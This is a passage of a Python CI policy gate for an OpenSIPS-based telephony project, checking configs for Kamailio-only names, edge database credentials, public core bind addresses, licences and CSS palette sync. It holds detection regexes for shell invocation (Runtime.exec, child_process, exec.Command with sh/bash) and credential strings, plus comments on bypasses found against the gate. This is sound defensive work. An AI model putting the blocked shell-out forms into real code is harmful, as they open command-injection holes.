#!/usr/bin/env python3
"""
MEGATRON structural policy gate.

This enforces the rules in CONTRIBUTING.md that can be checked by reading the
repository. It is deliberately stdlib-only and dependency-free so that it runs
identically on a developer's box and on a CI runner, and so that it can never
itself become a supply-chain concern in a project whose entire pitch is not
being MagnusBilling.

The rules here are not style. Each one corresponds to a specific way the
incumbent platforms failed, or to a mistake this project has already made once:

  KAMAILIO-NAMES   OpenSIPS has no htable/sanity/secfilter. Copy-pasted
                   Kamailio advice does not load, and it cost this project
                   real time. Never again silently.
  EDGE-CREDENTIALS The edge holds no database credential. This is the property
                   that makes an edge compromise survivable.
  CORE-PRIVATE     The core binds a private address. A public address there
                   dissolves the "no route from the internet" guarantee.
  ROUTE-TARGETS    A named route is called as route(name), not name().
  NO-SHELL-OUT     CVE-2023-30258 was one exec() with a concatenated string.
  MONEY-NOT-FLOAT  Money is integer micro-units. Never a float.
  LICENCE          No GPL/AGPL code linked into a MEGATRON binary.
  THEME-SYNC       tokens.css repeats its palette across three theme blocks,
                   and an edit has already updated only two of them.
  PALETTE          The colours an operator reads during an attack must clear
                   the contrast and colour-vision floors. Measured, not judged.
  INSTALLER-ASSETS The wizard's masthead is the first thing an operator sees,
                   on the least forgiving terminal a program ever renders on.

Exit code 0 = clean, 1 = at least one violation.
"""

from __future__ import annotations

import json
import os
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path

# Overridable so that ci/test_policy_check.py can point the gate at fixture
# trees containing deliberate violations. A gate nobody has ever seen fail is
# indistinguishable from a gate that cannot fail.
REPO = Path(os.environ.get("MEGATRON_REPO_ROOT", Path(__file__).resolve().parent.parent)).resolve()


@dataclass
class Findings:
    violations: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)

    def fail(self, rule: str, path: Path, line_no: int | None, message: str) -> None:
        where = path.relative_to(REPO).as_posix()
        if line_no is not None:
            where = f"{where}:{line_no}"
        self.violations.append(f"[{rule}] {where}: {message}")

    def note(self, message: str) -> None:
        self.notes.append(message)


def sip_configs() -> list[Path]:
    return sorted(REPO.glob("*/opensips/*.cfg"))


def read_lines(path: Path) -> list[tuple[int, str]]:
    text = path.read_text(encoding="utf-8", errors="replace")
    return list(enumerate(text.splitlines(), start=1))


def strip_comment(line: str) -> str:
    """OpenSIPS config comments start with '#'. There is no string literal in
    which a '#' is meaningful for the checks below, so this is sufficient and
    avoids matching rules inside explanatory prose."""
    return line.split("#", 1)[0]


# ---------------------------------------------------------------------------
# KAMAILIO-NAMES
# ---------------------------------------------------------------------------

KAMAILIO_ONLY = {
    "htable": "use cachedb_local (collections via cache_collections; cache_store/cache_fetch are core script functions)",
    "sanity": "use sipmsg_validate() from sipmsgops",
    "secfilter": "use textops/sipmsgops matching plus permissions",
    "sht_": "htable pseudo-variable family does not exist in OpenSIPS",
    "sanity_check": "use sipmsg_validate() from sipmsgops",
}


def check_kamailio_names(f: Findings) -> None:
    for cfg in sip_configs():
        for n, raw in read_lines(cfg):
            line = strip_comment(raw)
            if not line.strip():
                continue
            for name, remedy in KAMAILIO_ONLY.items():
                # loadmodule "htable.so" / sanity_check() / $sht(...)
                pattern = rf'(loadmodule\s*"{name}|[^\w]{name}\s*\(|\${name})'
                if re.search(pattern, line):
                    f.fail(
                        "KAMAILIO-NAMES", cfg, n,
                        f"'{name}' is a Kamailio name and does not exist in OpenSIPS 3.6 — {remedy}",
                    )


# ---------------------------------------------------------------------------
# EDGE-CREDENTIALS
#
# The single most load-bearing security property in the topology. If the edge
# can reach a database, a compromised edge yields tariff data, PII and ledger
# access, and the whole edge/core split stops buying anything.
# ---------------------------------------------------------------------------

CREDENTIAL_MARKERS = [
    (re.compile(r"\b(postgres|postgresql|mysql)://", re.I), "a database connection string"),
    (re.compile(r'loadmodule\s*"db_(postgres|mysql|sqlite|unixodbc)\.so"'), "a database driver module"),
    (re.compile(r'loadmodule\s*"auth_db\.so"'), "auth_db, which requires database credentials"),
]

# A modparam setting db_url to a NON-EMPTY value. Several modules the edge does
# legitimately use (permissions, dispatcher) accept a db_url and are told to run
# in file/static mode by being given an empty one. Flagging the parameter itself
# would flag exactly the lines that prove the property holds; what matters is
# whether a value was supplied.
DB_URL_RE = re.compile(r'modparam\s*\(\s*"[^"]+"\s*,\s*"db_url"\s*,\s*"([^"]*)"')


def check_edge_holds_no_credentials(f: Findings) -> None:
    edge = REPO / "edge"
    if not edge.is_dir():
        f.note("no edge/ directory yet — EDGE-CREDENTIALS not exercised")
        return
    for cfg in sorted(edge.rglob("*.cfg")):
        asserted_empty = 0
        for n, raw in read_lines(cfg):
            line = strip_comment(raw)
            for pattern, what in CREDENTIAL_MARKERS:
                if pattern.search(line):
                    f.fail(
                        "EDGE-CREDENTIALS", cfg, n,
                        f"edge config references {what}. The edge asks the core a narrow "
                        f"question; it does not look things up. See CONTRIBUTING.md.",
                    )
            m = DB_URL_RE.search(line)
            if m:
                if m.group(1).strip():
                    f.fail(
                        "EDGE-CREDENTIALS", cfg, n,
                        f"edge config sets a non-empty db_url ({m.group(1)!r}). The edge "
                        f"holds no database credential — that is the property that makes "
                        f"an edge compromise survivable. See CONTRIBUTING.md.",
                    )
                else:
                    asserted_empty += 1
        if asserted_empty:
            f.note(f"{cfg.relative_to(REPO).as_posix()}: {asserted_empty} module(s) pinned "
                   f"to file/static mode via an empty db_url")


# ---------------------------------------------------------------------------
# CORE-PRIVATE
# ---------------------------------------------------------------------------

SOCKET_RE = re.compile(r"^\s*socket\s*=\s*\w+:\[?([0-9a-fA-F:.]+)\]?:", re.M)


def is_private_v4(addr: str) -> bool:
    parts = addr.split(".")
    if len(parts) != 4 or not all(p.isdigit() for p in parts):
        return False
    a, b = int(parts[0]), int(parts[1])
    return (
        a == 10
        or (a == 172 and 16 <= b <= 31)
        or (a == 192 and b == 168)
        or a == 127
    )


def check_core_binds_private(f: Findings) -> None:
    core = REPO / "core" / "opensips"
    if not core.is_dir():
        f.note("no core/opensips directory yet — CORE-PRIVATE not exercised")
        return
    for cfg in sorted(core.glob("*.cfg")):
        found_any = False
        for n, raw in read_lines(cfg):
            line = strip_comment(raw)
            m = SOCKET_RE.match(line)
            if not m:
                continue
            found_any = True
            addr = m.group(1)
            if ":" in addr:  # IPv6: only loopback and unique-local are acceptable
                if not (addr.startswith("fd") or addr.startswith("fc") or addr == "::1"):
                    f.fail("CORE-PRIVATE", cfg, n,
                           f"core binds non-private IPv6 address {addr}")
                continue
            if not is_private_v4(addr):
                f.fail("CORE-PRIVATE", cfg, n,
                       f"core binds {addr}, which is not a private address. The core "
                       f"must have no route from the public internet "
                       f"(ARCHITECTURE.md 4.5b).")
        if not found_any:
            f.fail("CORE-PRIVATE", cfg, None,
                   "core config declares no socket= line, so the bind address is "
                   "unconstrained and defaults to every interface")


# ---------------------------------------------------------------------------
# ROUTE-TARGETS
#
# opensips -C catches a call to a route that does not exist, but only once the
# config parses far enough. Catching it here gives a precise line number and
# runs on machines with no OpenSIPS installed.
# ---------------------------------------------------------------------------

ROUTE_DEF_RE = re.compile(r"^\s*(route|failure_route|onreply_route|branch_route|local_route|startup_route|timer_route|event_route)\s*\[\s*([A-Za-z_][\w]*)\s*\]")
ROUTE_CALL_RE = re.compile(r"[^\w](route)\s*\(\s*([A-Za-z_][\w]*)\s*\)")


def check_route_targets(f: Findings) -> None:
    for cfg in sip_configs():
        defined: set[str] = set()
        calls: list[tuple[int, str]] = []
        for n, raw in read_lines(cfg):
            line = strip_comment(raw)
            m = ROUTE_DEF_RE.match(line)
            if m:
                defined.add(m.group(2))
            for cm in ROUTE_CALL_RE.finditer(" " + line):
                calls.append((n, cm.group(2)))
        for n, target in calls:
            if target not in defined:
                f.fail("ROUTE-TARGETS", cfg, n,
                       f"route({target}) has no matching route[{target}] block in this file")


# ---------------------------------------------------------------------------
# NO-SHELL-OUT and MONEY-NOT-FLOAT
#
# No Kotlin or Go exists in the repository yet. These checks are written now
# rather than later precisely because they are cheap now: the first time
# somebody adds a service, the gate is already standing. A check that only
# appears after the code it governs has never once prevented anything.
# ---------------------------------------------------------------------------

SOURCE_GLOBS = ("**/*.kt", "**/*.kts", "**/*.go", "**/*.java", "**/*.ts", "**/*.tsx")

SHELL_OUT_PATTERNS = [
    (re.compile(r"\bRuntime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\b"), "Runtime.exec"),
    (re.compile(r"\bProcessBuilder\s*\(\s*\"" ), "ProcessBuilder with a single string (use an argv list)"),
    (re.compile(r"\bexec\.Command\s*\(\s*\"(sh|bash|/bin/sh|/bin/bash|cmd)\b"), "exec.Command invoking a shell"),
    (re.compile(r"\bchild_process\b"), "child_process"),
]

FLOAT_MONEY_PATTERNS = [
    (re.compile(r"\b(Double|Float)\b"), "a floating-point type"),
    (re.compile(r"\bfloat(32|64)\b"), "a floating-point type"),
]

MONEY_PATH_HINTS = ("billing", "rating", "ledger", "tariff", "invoice", "money")


def source_files() -> list[Path]:
    out: list[Path] = []
    for pattern in SOURCE_GLOBS:
        for p in REPO.glob(pattern):
            if ".git" in p.parts or "node_modules" in p.parts or "build" in p.parts:
                continue
            out.append(p)
    return sorted(out)


def check_source_rules(f: Findings) -> None:
    files = source_files()
    if not files:
        f.note("no Kotlin/Go/TypeScript source yet — NO-SHELL-OUT and MONEY-NOT-FLOAT "
               "are armed but not yet exercised")
        return
    for path in files:
        rel = path.relative_to(REPO).as_posix().lower()
        is_money = any(hint in rel for hint in MONEY_PATH_HINTS)
        # Block comments are blanked before scanning, for the third time in
        # this file's history and the same reason each time: the KDoc on
        # Money.kt explains at length why a Double must never appear in a
        # money path, and that explanation was flagged as a Double in a money
        # path. Prose about a rule must not trip the rule.
        source = blank_line_comments(
            blank_block_comments(path.read_text(encoding="utf-8", errors="replace")))
        for n, line in enumerate(source.splitlines(), start=1):
            code = line
            for pattern, what in SHELL_OUT_PATTERNS:
                if pattern.search(code):
                    f.fail("NO-SHELL-OUT", path, n,
                           f"{what}. Node-side operations go to the Go agent as a typed "
                           f"message with a closed verb set.")
            if is_money:
                for pattern, what in FLOAT_MONEY_PATTERNS:
                    if pattern.search(code):
                        f.fail("MONEY-NOT-FLOAT", path, n,
                               f"{what} in a money path. Use Long micro-units internally "
                               f"and BigDecimal at boundaries.")


# ---------------------------------------------------------------------------
# LICENCE
#
# The gate that CONTRIBUTING.md promises exists. Two halves:
#
#  (a) Nothing copyleft is vendored into the tree. MEGATRON depends on GPL
#      software installed separately from distro repositories; it never
#      redistributes it.
#
#  (b) Dependency manifests are scanned. There are none yet. Rather than
#      quietly passing, this FAILS when a manifest type appears that it does
#      not know how to scan — so the gate cannot be silently outgrown by the
#      first person to add a build file. That is the failure mode that makes
#      most licence gates worthless by month six.
# ---------------------------------------------------------------------------

COPYLEFT_MARKERS = re.compile(
    r"(GNU GENERAL PUBLIC LICENSE|GNU AFFERO GENERAL PUBLIC LICENSE|"
    r"GNU LESSER GENERAL PUBLIC LICENSE|SPDX-License-Identifier:\s*(A?GPL|LGPL))",
    re.I,
)

KNOWN_MANIFESTS = {
    "build.gradle.kts": True,    # scanner: scan_gradle_manifest, below
    "build.gradle": True,
    "pom.xml": False,
    "go.mod": False,
    "package.json": False,
    "Cargo.toml": False,
    # Python was missing from this list while the project's own CI already
    # depended on pip packages, which made the one ecosystem actually in use
    # the one ecosystem invisible to the rule.
    "requirements.txt": False,
    "pyproject.toml": False,
    "Pipfile": False,
    "setup.py": False,
}

# KNOWN GAP, stated rather than left implicit: .github/workflows/validate.yml
# installs pinned packages with an inline `pip install`, so those dependencies
# enter CI without passing through any manifest this rule can see. They are
# test-time only and never linked into a shipped MEGATRON binary, which is why
# it is a note and not a violation — but "no manifest exists" is not the same
# as "nothing is being installed", and the difference belongs in writing.
INLINE_DEPENDENCY_NOTE = (
    "CI installs pinned pip packages inline (openapi-spec-validator, jsonschema, "
    "pyyaml) — test-time only, never linked into a shipped binary, and not covered "
    "by any manifest scan"
)

# Files that legitimately discuss copyleft without being copyleft: our own
# licence, the documents that explain the copyleft posture, this gate, and the
# gate's tests (which must contain a GPL header as a fixture in order to prove
# the gate detects one).
#
# Keep this list short and specific. Every entry is a place the scanner is
# blind, so a new one belongs in a PR that says why.
LICENCE_DISCUSSION_ALLOWLIST = {
    "docs/ARCHITECTURE.md",
    "CONTRIBUTING.md",
    "LICENSE",
    "ci/policy_check.py",
    "ci/test_policy_check.py",
    "docs/ONBOARDING.md",
    "README.md",
}


APPROVED_DEPENDENCIES = "ci/approved-dependencies.json"

# group:artifact:version inside a dependency declaration. Deliberately narrow:
# it matches the string-notation form the build files use, and anything it
# cannot read is reported rather than skipped.
GRADLE_DEP_RE = re.compile(
    r"""(?:implementation|api|compileOnly|runtimeOnly|testImplementation"""
    r"""|testRuntimeOnly|testCompileOnly|annotationProcessor|ksp|kapt)"""
    r"""\s*\(\s*["']([^"':]+):([^"':]+):([^"']+)["']\s*\)""")

# An internal module: implementation(project(":rating")). Our own code, so
# there is no third-party licence to check — but it is still matched
# explicitly rather than ignored, so that it does not fall through to the
# opaque-dependency rule below and so that a typo'd form still fails.
GRADLE_PROJECT_DEP_RE = re.compile(
    r"""(?:implementation|api|compileOnly|runtimeOnly|testImplementation"""
    r"""|testRuntimeOnly|testCompileOnly|annotationProcessor|ksp|kapt)"""
    r"""\s*\(\s*project\s*\(\s*["'][^"']+["']\s*\)\s*\)""")

# A dependency declared some other way — a version catalog reference, a
# variable, a platform BOM. Not necessarily wrong, but not readable by this
# scanner, and therefore not something it may pass silently.
GRADLE_OPAQUE_DEP_RE = re.compile(
    r"""(?:implementation|api|compileOnly|runtimeOnly|testImplementation"""
    r"""|testRuntimeOnly|testCompileOnly|annotationProcessor|ksp|kapt)"""
    r"""\s*\(\s*(?!["'])""")


def load_approved_dependencies(f: Findings) -> dict | None:
    path = REPO / APPROVED_DEPENDENCIES
    if not path.is_file():
        f.fail("LICENCE", path, None,
               f"{APPROVED_DEPENDENCIES} is missing, so no dependency can be checked "
               f"against anything. Restore it rather than dropping the rule.")
        return None
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        f.fail("LICENCE", path, None, f"is not valid JSON: {exc}")
        return None


def scan_gradle_manifest(f: Findings, manifest: Path, approved: dict) -> None:
    """Every dependency must be listed, with a licence we accept.

    Fails closed twice over: an unlisted dependency fails, and a dependency
    this scanner cannot READ also fails. The second matters more than it
    looks — a version catalog reference or a BOM is a perfectly normal way to
    declare a dependency, and a scanner that quietly ignores what it does not
    understand provides exactly as much protection as no scanner while
    looking like it provides some.
    """
    source = blank_line_comments(
        blank_block_comments(manifest.read_text(encoding="utf-8", errors="replace")))

    allowed = set(approved.get("allowed_licences", []))
    forbidden = set(approved.get("forbidden_licences", []))
    listed = approved.get("dependencies", {})

    found = 0
    for match in GRADLE_DEP_RE.finditer(source):
        group, artifact, version = match.groups()
        coordinate = f"{group}:{artifact}"
        line_no = _line_of(source, match.start())
        found += 1

        entry = listed.get(coordinate)
        if entry is None:
            f.fail("LICENCE", manifest, line_no,
                   f"'{coordinate}' is not in {APPROVED_DEPENDENCIES}. Every dependency "
                   f"MEGATRON links must be approved with its licence first — a "
                   f"GPL/AGPL/LGPL dependency here is not a problem to discover later, "
                   f"it is a product that cannot ship.")
            continue

        licence = entry.get("licence")
        if licence in forbidden:
            f.fail("LICENCE", manifest, line_no,
                   f"'{coordinate}' is {licence}. MEGATRON is proprietary and "
                   f"distributed to licensees; it cannot link copyleft code. Depend on "
                   f"it out-of-process, or find another library.")
        elif licence not in allowed:
            f.fail("LICENCE", manifest, line_no,
                   f"'{coordinate}' is recorded as {licence!r}, which is neither on the "
                   f"allowed nor the forbidden list. Decide deliberately and add it to "
                   f"one of them.")
        if not entry.get("why"):
            f.fail("LICENCE", manifest, line_no,
                   f"'{coordinate}' has no `why`. A dependency nobody can justify is one "
                   f"that gets renewed forever without being reconsidered.")

    # Internal module dependencies carry no third-party licence. Blanked so
    # they do not read as unparseable to the opaque check below.
    internal = 0

    def _blank_internal(m: re.Match) -> str:
        nonlocal internal
        internal += 1
        return " " * len(m.group(0))

    source = GRADLE_PROJECT_DEP_RE.sub(_blank_internal, source)

    opaque = list(GRADLE_OPAQUE_DEP_RE.finditer(source))
    for match in opaque:
        f.fail("LICENCE", manifest, _line_of(source, match.start()),
               "a dependency is declared in a form this scanner cannot read (a version "
               "catalog reference, a variable, or a BOM). That may be perfectly correct, "
               "but it cannot be licence-checked here — declare it as a literal "
               "'group:artifact:version', or teach the scanner.")

    if found == 0 and not opaque and internal == 0:
        f.note(f"{manifest.relative_to(REPO).as_posix()}: no dependencies declared")


def check_licence(f: Findings) -> None:
    for path in REPO.rglob("*"):
        if not path.is_file() or ".git" in path.parts:
            continue
        rel = path.relative_to(REPO).as_posix()
        if rel in LICENCE_DISCUSSION_ALLOWLIST:
            continue
        if path.suffix.lower() in {".png", ".jpg", ".gif", ".zip", ".jar", ".gz", ".ico"}:
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="strict")
        except (UnicodeDecodeError, OSError):
            continue
        if COPYLEFT_MARKERS.search(text):
            f.fail("LICENCE", path, None,
                   "file carries a copyleft licence header. MEGATRON is proprietary and "
                   "must not vendor GPL/AGPL/LGPL code — depend on it via distro packages "
                   "instead.")

    unscannable = []
    scanned = 0
    approved = None
    for name, have_scanner in KNOWN_MANIFESTS.items():
        for found in REPO.rglob(name):
            if ".git" in found.parts or "build" in found.parts:
                continue
            if not have_scanner:
                unscannable.append(found.relative_to(REPO).as_posix())
                continue
            if name in ("build.gradle.kts", "build.gradle"):
                if approved is None:
                    approved = load_approved_dependencies(f)
                    if approved is None:
                        return
                scan_gradle_manifest(f, found, approved)
                scanned += 1

    if scanned:
        f.note(f"{scanned} Gradle manifest(s) scanned against {APPROVED_DEPENDENCIES}")

    if unscannable:
        for rel in unscannable:
            f.violations.append(
                f"[LICENCE] {rel}: a dependency manifest exists but this gate has no "
                f"scanner for it. Dependencies are entering the build unscanned. Add a "
                f"scanner to ci/policy_check.py before merging this."
            )
    elif not scanned:
        f.note("no dependency manifests yet — licence scanning is header-only so far, "
               "and this gate will fail the moment a manifest appears without a scanner")
    f.note(INLINE_DEPENDENCY_NOTE)


# ---------------------------------------------------------------------------
# THEME-SYNC and PALETTE
#
# ui/tokens.css declares its colour palette three times: once for light, once
# for the OS dark preference, once for an explicit dark choice. Plain CSS
# offers no way to share one declaration between the last two without
# light-dark(), which we are not yet willing to require of an operator's
# browser. So the duplication stays and the drift is made impossible instead.
#
# This is not hypothetical. The commit that fixed the ink ladder updated two
# of the three blocks and left the third stale; the file looked fine in review.
#
# PALETTE then measures what those blocks actually say. The dashboard's whole
# job is to be readable by a tired operator at 3am during an attack, quite
# possibly one of the ~8% of men with a colour-vision deficiency. That is a
# measurable property, so it gets measured rather than admired.
# ---------------------------------------------------------------------------

TOKENS_CSS = "ui/tokens.css"

CSS_COMMENT_RE = re.compile(r"/\*.*?\*/", re.S)
CSS_BLOCK_RE = re.compile(r"([^{}]+)\{([^{}]*)\}", re.S)
CSS_DECL_RE = re.compile(r"(--[\w-]+)\s*:\s*([^;]+?)\s*(?:;|$)")
HEX_RE = re.compile(r"^#[0-9a-fA-F]{6}$")
MG_TOKEN_DECL_RE = re.compile(r"--mg-[\w-]+\s*:")

# The three blocks that must agree, keyed by the normalised selector. The
# @media wrapper is not part of the selector — the block regex below skips
# any construct whose body is another block, which is exactly the at-rule.
BASE_SELECTOR = ":root"
DARK_SELECTORS = (':root:not([data-theme="light"])', ':root[data-theme="dark"]')
LIGHT_SELECTOR = ':root[data-theme="light"]'

# The ONLY selectors allowed to declare --mg-* tokens. Anything else fails the
# build, and that is the fix for a real bypass: this gate keys blocks by
# selector text and has no model of the CSS cascade, so a rule the browser
# honours but the gate does not recognise is a colour that renders having
# never been measured. Both of these passed clean before the rule existed:
#
#   html:root[data-theme="dark"] { --mg-ink-faint: #14181B; }
#       — specificity (0,2,1) beats the checked (0,2,0) and wins outright
#   [data-theme="dark"]:root     { --mg-ink-faint: #14181B; }
#       — identical specificity, later in source order, so it also wins
#
# Recognising selectors is a losing game (there are unbounded ways to write
# an equivalent one). Refusing to accept any selector but the four canonical
# forms is not: an author who genuinely needs a fifth changes this tuple
# deliberately and says why, which is exactly the review we want.
CANONICAL_SELECTORS = (BASE_SELECTOR, *DARK_SELECTORS, LIGHT_SELECTOR)


def parse_css_tokens(text: str) -> dict[str, dict[str, str]]:
    """Return {selector: {token: value}} for every block that declares --mg-*.

    Deliberately a small hand-rolled parser rather than a dependency: this gate
    is stdlib-only on purpose (see the module docstring), and the subset of CSS
    tokens.css uses is a flat list of custom properties.
    """
    text = CSS_COMMENT_RE.sub("", text)
    blocks: dict[str, dict[str, str]] = {}
    for selector, body in CSS_BLOCK_RE.findall(text):
        decls = dict(CSS_DECL_RE.findall(body))
        if not decls:
            continue
        key = " ".join(selector.split())
        # A selector list or repeated block merges rather than overwrites, so a
        # split declaration cannot hide half the tokens from the sync check.
        blocks.setdefault(key, {}).update(decls)
    return blocks


def check_theme_blocks_in_sync(f: Findings) -> None:
    path = REPO / TOKENS_CSS
    if not path.is_file():
        f.note(f"no {TOKENS_CSS} yet — THEME-SYNC and PALETTE not exercised")
        return

    text = path.read_text(encoding="utf-8")

    # @layer breaks the one assumption parse_css_tokens makes about ordering.
    # An unlayered normal rule beats a layered one no matter where either sits
    # in the file (CSS Cascading and Inheritance L5), so "last occurrence in
    # the text wins" — which is what dict.update() implements — is provably
    # wrong the moment a layer exists. That is not a parser bug to work
    # around; it is a signal this gate cannot reason about the file, so it
    # stops rather than guessing.
    # @scope is here for the same reason: it introduces scoping proximity as a
    # tie-breaker that runs BEFORE source order, so it too can change which
    # declaration wins without changing which one comes last.
    #
    # @media and @container are deliberately NOT in this list. They change
    # which rules MATCH, not which of two matching declarations wins, so
    # source order still decides and the parser's assumption holds.
    # Case-INSENSITIVE, because CSS at-rule keywords are. A plain `@LAYER`
    # reopened this bypass completely while the substring check said nothing.
    stripped = blank_block_comments(text)
    for at_rule in ("@layer", "@scope"):
        if re.search(re.escape(at_rule), stripped, re.I):
            f.fail("THEME-SYNC", path, None,
                   f"{at_rule} changes which declaration wins independently of source "
                   f"order, and this gate resolves duplicates by source order. It cannot "
                   f"tell you which value the browser would actually use, so it refuses to "
                   f"guess. Declare tokens outside it.")

    # Colour tokens may live in exactly one file. Anything else under ui/ that
    # declares --mg-* is invisible to every check below, and a plain second
    # stylesheet loaded after this one wins in the browser for the same
    # selector — no exotic syntax required. That was a clean bypass:
    #   ui/shield/theme-override.css
    #     :root[data-theme="dark"] { --mg-ink-faint: var(--mg-ground); }
    # no hex, no colour function, nothing for UI-SELF-CONTAINED to match, and
    # ink rendered invisible on its own background while every rule said PASS.
    # Matched on the lowercased suffix rather than with rglob("*.css"): glob is
    # case-insensitive on Windows and case-sensitive on Linux, so a file named
    # theme.CSS would be scanned on the machine this was written on and
    # invisible on the CI runner that actually gates the merge.
    other_css = ([p for p in sorted((REPO / UI_DIR).rglob("*"))
                  if p.is_file() and p.suffix.lower() == ".css"]
                 if (REPO / UI_DIR).is_dir() else [])
    for other in other_css:
        if other.resolve() == path.resolve():
            continue
        if MG_TOKEN_DECL_RE.search(blank_block_comments(
                other.read_text(encoding="utf-8", errors="replace"))):
            f.fail("THEME-SYNC", other, None,
                   f"declares --mg-* tokens. They live in {TOKENS_CSS} and nowhere else: "
                   f"the contrast and colour-vision checks read only that file, and a "
                   f"stylesheet loaded after it wins in the browser while being measured "
                   f"by nothing.")

    blocks = parse_css_tokens(text)

    # Fail closed on any selector this gate does not model. See the comment on
    # CANONICAL_SELECTORS — an unrecognised selector is not an oddity, it is a
    # colour that renders without ever being measured.
    for selector in sorted(set(blocks) - set(CANONICAL_SELECTORS)):
        f.fail("THEME-SYNC", path, None,
               f"'{selector}' declares --mg-* tokens, and this gate only models "
               f"{', '.join(CANONICAL_SELECTORS)}. It has no model of the CSS cascade, so "
               f"a selector it does not recognise can win in the browser while never being "
               f"measured here. Move the tokens into a canonical block, or add this form to "
               f"CANONICAL_SELECTORS deliberately.")

    base = blocks.get(BASE_SELECTOR)
    if not base:
        f.fail("THEME-SYNC", path, None,
               f"no '{BASE_SELECTOR}' block declaring --mg-* tokens was found")
        return

    # A token is a colour token if :root gives it a hex value OR any theme
    # block restates it. Deriving the set from BOTH sides matters: taking it
    # only from :root means a value :root writes in a form the regex cannot
    # read (a 3-digit #9AA, rgb(), a named colour, a trailing !important)
    # quietly drops out of the set and stops being measured at all. Every
    # token in the union must then be a parseable 6-digit hex EVERYWHERE, so
    # an unreadable value fails the build instead of disappearing from it.
    theme_blocks = {sel: blocks.get(sel) for sel in (*DARK_SELECTORS, LIGHT_SELECTOR)}
    colour_tokens = {name for name, value in base.items() if HEX_RE.match(value)}
    for block in theme_blocks.values():
        if block:
            colour_tokens |= set(block)
    if not colour_tokens:
        f.fail("THEME-SYNC", path, None, f"'{BASE_SELECTOR}' declares no colour tokens")
        return

    for selector, block in (((BASE_SELECTOR, base),) + tuple(theme_blocks.items())):
        if block is None:
            f.fail("THEME-SYNC", path, None,
                   f"missing theme block '{selector}'. Every theme must restate every "
                   f"colour token, or a token silently inherits the wrong mode's value.")
            continue
        missing = sorted(colour_tokens - set(block))
        if missing:
            f.fail("THEME-SYNC", path, None,
                   f"'{selector}' omits {', '.join(missing)} — those tokens would keep "
                   f"the other theme's value")
        for token in sorted(colour_tokens & set(block)):
            if not HEX_RE.match(block[token]):
                f.fail("THEME-SYNC", path, None,
                       f"'{selector}' sets {token} to {block[token]!r}, which this gate "
                       f"cannot measure. Colour tokens are written as 6-digit hex so the "
                       f"contrast and colour-vision checks can read them — a form they "
                       f"cannot parse is a colour that silently stops being checked. If "
                       f"this is genuinely not a colour, do not declare it in a theme "
                       f"block.")

    # The two dark blocks are the same palette written twice. Byte-identical
    # values, or the OS-preference path and the explicit-toggle path render
    # differently and only one of them ever gets looked at.
    dark_a, dark_b = (blocks.get(s) or {} for s in DARK_SELECTORS)
    if dark_a and dark_b:
        for token in sorted(set(dark_a) & set(dark_b)):
            if dark_a[token].lower() != dark_b[token].lower():
                f.fail("THEME-SYNC", path, None,
                       f"{token} is {dark_a[token]} in '{DARK_SELECTORS[0]}' but "
                       f"{dark_b[token]} in '{DARK_SELECTORS[1]}'. The OS-preference and "
                       f"explicit-choice dark paths must be the same palette.")

    # ...and the explicit light block must match :root for the same reason.
    light = blocks.get(LIGHT_SELECTOR) or {}
    for token in sorted(colour_tokens & set(light)):
        if base[token].lower() != light[token].lower():
            f.fail("THEME-SYNC", path, None,
                   f"{token} is {base[token]} in '{BASE_SELECTOR}' but {light[token]} in "
                   f"'{LIGHT_SELECTOR}'. Toggling to light must return the default theme.")


# Surfaces a token can land on, worst-case first. Ink is checked against all
# three: measuring only against --mg-raised is how --mg-ink-faint originally
# shipped at 2.70:1 on --mg-ground.
SURFACE_TOKENS = ("--mg-ground", "--mg-raised", "--mg-sunken")
INK_TOKENS = ("--mg-ink", "--mg-ink-muted", "--mg-ink-faint")
STATUS_PAIRS = (("--mg-good", "--mg-good-bg"),
                ("--mg-warning", "--mg-warning-bg"),
                ("--mg-critical", "--mg-critical-bg"))
SERIES_RE = re.compile(r"^--mg-series-(\d+)$")

TEXT_CONTRAST_MIN = 4.5   # WCAG AA, small text. Every ink step carries small text.
NONTEXT_CONTRAST_MIN = 3.0  # focus rings, link underlines, chart marks

# Tokens this rule MUST be able to measure. Without this list the gate fails
# OPEN in the most inviting way available: delete or rename --mg-series-*, and
# the entire categorical/colour-vision battery stops running while the gate
# still prints PASS. That was a real bypass, found by attacking this file
# rather than by reading it, and it is the same failure mode the LICENCE rule
# already refuses (it fails closed on a manifest it has no scanner for).
#
# Two series is the minimum a shield dashboard needs: accepted and absorbed.
REQUIRED_TOKENS = (SURFACE_TOKENS + INK_TOKENS + ("--mg-accent",)
                   + tuple(t for pair in STATUS_PAIRS for t in pair))
REQUIRED_SERIES = 2


def load_validator():
    """Import ui/validate_palette.py as the colour-maths library.

    Resolved against the tree under test first, then against this gate's own
    checkout. The fallback matters: ci/test_policy_check.py points the gate at
    fixture trees that contain a tokens.css but no ui/ tooling, and without it
    every fixture would fail for the wrong reason and mask the rule it is
    actually testing.
    """
    import importlib.util

    # Everything check_palette() actually calls. Verified rather than assumed:
    # this function executes a file out of the tree under test, and a module
    # that imports fine but lacks one of these would take the gate down with
    # an AttributeError halfway through a run — which reads as "the gate is
    # broken" rather than "your palette is wrong".
    required = ("contrast", "validate")

    for base in (REPO / "ui", Path(__file__).resolve().parent.parent / "ui"):
        candidate = base / "validate_palette.py"
        if not candidate.is_file():
            continue
        spec = importlib.util.spec_from_file_location("megatron_validate_palette", candidate)
        if spec is None or spec.loader is None:
            continue
        module = importlib.util.module_from_spec(spec)
        try:
            spec.loader.exec_module(module)
        except Exception:  # noqa: BLE001 - any import-time failure, keep looking
            continue
        if all(hasattr(module, name) for name in required):
            return module
    return None


def check_palette(f: Findings) -> None:
    path = REPO / TOKENS_CSS
    if not path.is_file():
        return  # already noted by THEME-SYNC

    vp = load_validator()
    if vp is None:
        f.fail("PALETTE", path, None,
               "ui/validate_palette.py is missing, so the palette claims in tokens.css "
               "cannot be checked. Restore it rather than dropping the rule — a colour "
               "gate that silently stops running is worse than no colour gate.")
        return

    blocks = parse_css_tokens(path.read_text(encoding="utf-8"))
    modes = {"light": blocks.get(BASE_SELECTOR) or {},
             "dark": blocks.get(DARK_SELECTORS[1]) or {}}

    for mode, tokens in modes.items():
        if not tokens:
            f.fail("PALETTE", path, None,
                   f"{mode}: no token block found, so nothing was measured")
            continue

        # Fail closed on anything this rule is supposed to measure but cannot.
